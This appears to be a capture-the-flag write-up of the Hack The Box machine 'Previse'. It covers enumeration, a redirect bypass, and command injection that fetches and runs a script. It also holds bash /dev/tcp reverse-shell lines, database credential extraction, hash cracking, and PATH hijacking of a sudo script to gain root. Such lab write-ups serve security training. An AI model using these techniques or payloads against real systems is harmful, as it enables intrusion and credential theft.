---
title: "Previse"
url: "/writeups/hackthebox/previse/"
summary: previse
tags:
- hackthebox
- linux
- idor
- command-injection
---

![Previse](/Previse.png)

## Scanning & Enumeration
### nmap
Started with an `nmap` scan:
* TCP all ports

```bash
kali@kali:~/ctf/htb/machines/previse$ sudo nmap T4 -p- 10.10.11.104 -oA nmap/tcp_all_ports
[sudo] password for kali:
Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-13 17:56 EDT
Failed to resolve "T4".
Nmap scan report for 10.10.11.104
Host is up (0.022s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```
* TCP with scripts against found ports
```bash
kali@kali:~/ctf/htb/machines/previse$ sudo nmap -sCV -p22,80 10.10.11.104 -oA nmap/tcp_scripts
[sudo] password for kali: 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-13 18:17 EDT
Nmap scan report for 10.10.11.104
Host is up (0.019s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 53:ed:44:40:11:6e:8b:da:69:85:79:c0:81:f2:3a:12 (RSA)
|   256 bc:54:20:ac:17:23:bb:50:20:f4:e1:6e:62:0f:01:b5 (ECDSA)
|_  256 33:c1:89:ea:59:73:b1:78:84:38:a4:21:10:0c:91:d8 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-title: Previse Login
|_Requested resource was login.php
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Enumeration
### Web Page
Opening up the web page it looks to be a generic Login form for a File Storage site. The login.php shows that the site is running on PHP.
![](/previse-login_page.png)
### gobuster
When navigating to the web page it shows that that PHP is being used so that can be added to an extension type for the directory busting.
```bash
kali@kali:~/ctf/htb/machines/previse$ sudo gobuster dir -u http://10.10.11.104/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,php -o gobuster_80 -q
/index.php            (Status: 302) [Size: 2801] [--> login.php]
/download.php         (Status: 302) [Size: 0] [--> login.php]   
/login.php            (Status: 200) [Size: 2224]                
/files.php            (Status: 302) [Size: 4914] [--> login.php]
/header.php           (Status: 200) [Size: 980]                 
/nav.php              (Status: 200) [Size: 1248]                
/footer.php           (Status: 200) [Size: 217]                 
/css                  (Status: 301) [Size: 310] [--> http://10.10.11.104/css/]
/status.php           (Status: 302) [Size: 2966] [--> login.php]              
/js                   (Status: 301) [Size: 309] [--> http://10.10.11.104/js/] 
/logout.php           (Status: 302) [Size: 0] [--> login.php]                 
/accounts.php         (Status: 302) [Size: 3994] [--> login.php]              
/config.php           (Status: 200) [Size: 0]                                 
/logs.php             (Status: 302) [Size: 0] [--> login.php]                 
/server-status        (Status: 403) [Size: 277]                               
```
Looks like a lot of files are redirecting back to the login.php page hinting at needing credentials.
### /nav.php page
On the nav.php page, each link can be intercepted using Burp Suite, to see what can be done with the requests.
![](/previse-nav_page.png)
When selecting the CREATE ACCOUNT link, the below request is made:
![](/previse-accounts_get.png)
When intercepting the response to this request, there is a 302 response is returned and some page data can be seen.
![](/previse-accounts_302.png)
Modifying the 302 to a 200, allows access to account.php where a new account can be created.
![](/previse-accounts_200.png)
### /accounts.php
![](/previse-accounts_page.png)
After creating a new account, and then logging into that account, additional enumeration can be done.
### /status.php
The status.php page reveals that the web site is using a MySQL server, that there are two registered admins, and one file has been uploaded.
![](/previse-status_page.png)
### /files.php
The files.php page shows an upload field and the file that have been uploaded.
![](/previse-files_page.png)
After downloading and extracting the SITEBACKUP.ZIP file a new page called file_logs.php is identified.
### /file_logs.php
When navigating to that page log data can be requested where the file delimiter can be specified from a drop down.
![](/previse-file_logs_page.png)
After selecting SUBMIT and intercepting the request, the below request is captured, with a `delim` variable and parameter set.
![](/previse-logs_page.png)
## Command Injection
When testing for command injection against the `delim` parameter it is possible to send a request from the target machine.
### Python Web Server
Started a web server to try an catch a request from the target.
```bash
kali@kali:~/ctf/htb/machines/previse/siteBackup1$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```
### Burp request
Modifying the request to send a `curl` request to our attack machine.
![](/previse-ci_burp_req.png)
And it can be seen that the request is made to the Python web server.
```bash
kali@kali:~/ctf/htb/machines/previse/siteBackup1$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...


10.10.11.104 - - [13/Aug/2022 19:47:48] "GET / HTTP/1.1" 200 -
```
### Reverse Shell
Now to create a reverse shell file to host via the Python web server and use curl again to get a reverse shell.
```bash
kali@kali:~/ctf/htb/machines/previse$ echo 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1' > revshell.sh
```
Started a `netcat` listener:
```bash
kali@kali:~/ctf/htb/machines/previse$ nc -lvnp 4444
listening on [any] 4444 ...
```
Modify the Burp request again to download and execute the revshell.sh file
![](/previse-ci_shell_burp_req.png)
And a reverse shell is returned as the www-data user:
```bash
connect to [10.10.14.5] from (UNKNOWN) [10.10.11.104] 49900
bash: cannot set terminal process group (1399): Inappropriate ioctl for device
bash: no job control in this shell
www-data@previse:/var/www/html$ 
www-data@previse:/var/www/html$ whoami
www-data
www-data@previse:/var/www/html$ hostname
previse
```
Shell upgrade:
```bash
www-data@previse:/var/www/html$ python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@previse:/var/www/html$ export TERM=xterm
```
## m4lwhere user
### Database
Looking in the config.php file there are credentials to a database:
```bash
www-data@previse:/var/www/html$ cat config.php  
<?php

function connectDB(){
    $host = 'localhost';
    $user = 'root';
    $passwd = 'mySQL_p@ssw0rd!:)';
    $db = 'previse';
    $mycon = new mysqli($host, $user, $passwd, $db);
    return $mycon;
}

?>
```
Connecting to the database and viewing its data:
```bash
www-data@previse:/var/www/html$ mysql -h localhost -u root -p'mySQL_p@ssw0rd!:)'
mysql> show databases;
show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| previse            |
| sys                |
+--------------------+

mysql> use previse;

mysql> show tables;
show tables;
+-------------------+
| Tables_in_previse |
+-------------------+
| accounts          |
| files             |
+-------------------+

mysql> select * from accounts;
+----+----------+------------------------------------+---------------------+
| id | username | password                           | created_at          |
+----+----------+------------------------------------+---------------------+
|  1 | m4lwhere | $1$🧂llol$DQpmdvnb7EeuO6UaqRItf. | 2021-05-27 18:18:36 |
|  2 | tester   | $1$🧂llol$UfA76/dcHlnMNoOlgyaZq1 | 2022-08-13 23:23:06 |
+----+----------+------------------------------------+---------------------+
```
The database shows a couple accounts, including m4lwhere, who is the only user on the machine.
Now to crack the password hash for the m4lwhere user.
### Password Crack
Copying the hash to a file called hash.txt and running `hashcat` against it to crack it. The password looks to be a md5crypt (based on https://hashcat.net/wiki/doku.php?id=example_hashes)
```bash
kali@kali:~/ctf/htb/machines/previse$ hashcat -m 500 hash.txt /usr/share/wordlists/rockyou.txt
...
$1$🧂llol$DQpmdvnb7EeuO6UaqRItf.:ilovecody112235!
```
### SSH
Now with the cracked password hash, the m4lwhere user can be logged into over SSH.
```bash
kali@kali:~/ctf/htb/machines/previse$ ssh m4lwhere@10.10.11.104
m4lwhere@10.10.11.104's password: ilovecody112235!
```
And a shell as the m4lwhere user is gained:
```bash
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-151-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun Aug 14 00:31:06 UTC 2022

  System load:  0.0               Processes:           180
  Usage of /:   51.3% of 4.85GB   Users logged in:     0
  Memory usage: 28%               IP address for eth0: 10.10.11.104
  Swap usage:   0%


0 updates can be applied immediately.


Last login: Fri Jun 18 01:09:10 2021 from 10.10.10.5
m4lwhere@previse:~$ whoami
m4lwhere
m4lwhere@previse:~$ id
uid=1000(m4lwhere) gid=1000(m4lwhere) groups=1000(m4lwhere)
m4lwhere@previse:~$ hostname
previse
```
#### user.txt
```bash
m4lwhere@previse:~$ cat user.txt 
652e288e09fd164a...
```
## root
### sudo -l
Checking the sudo privileges the m4lwhere has:
```bash
m4lwhere@previse:~$ sudo -l
[sudo] password for m4lwhere: 
User m4lwhere may run the following commands on previse:
    (root) /opt/scripts/access_backup.sh
```
Looking at the script that can be run with root privileges:
```bash
m4lwhere@previse:~$ cat /opt/scripts/access_backup.sh
#!/bin/bash

# We always make sure to store logs, we take security SERIOUSLY here

# I know I shouldnt run this as root but I cant figure it out programmatically on my account
# This is configured to run with cron, added to sudo so I can run as needed - we'll fix it later when there's time

gzip -c /var/log/apache2/access.log > /var/backups/$(date --date="yesterday" +%Y%b%d)_access.gz
gzip -c /var/www/file_access.log > /var/backups/$(date --date="yesterday" +%Y%b%d)_file_access.gz
```
It looks like the `gzip` command is using the `date` command without specifying the full path.
So it should be possible to create a malicious date file, add that to the beginning of the m4lwhere user's PATH, and have it executed within the access_backup.sh script as root.

```bash
m4lwhere@previse:~$ echo 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1' > date
m4lwhere@previse:~$ cat date 
bash -i >& /dev/tcp/10.10.14.5/4444 0>&1
m4lwhere@previse:~$ chmod +x date
m4lwhere@previse:~$ export PATH=/home/m4lwhere/:$PATH
```
Started a `netcat` listener:
```bash
kali@kali:~/ctf/htb/machines/previse$ nc -lvnp 4444
listening on [any] 4444 ...
```
Executed the access_backup.sh script with `sudo`:
```bash
m4lwhere@previse:~$ sudo /opt/scripts/access_backup.sh 

```
And the reverse shell returns with root access:
```bash
connect to [10.10.14.5] from (UNKNOWN) [10.10.11.104] 50360
root@previse:~# 
root@previse:~# whoami
whoami
root
root@previse:~# id
id
uid=0(root) gid=0(root) groups=0(root)
root@previse:~# hostname
hostname
previse
```
#### root.txt
```bash
root@previse:/root# cat root.txt
cat root.txt
a01417a61ab18617...
```
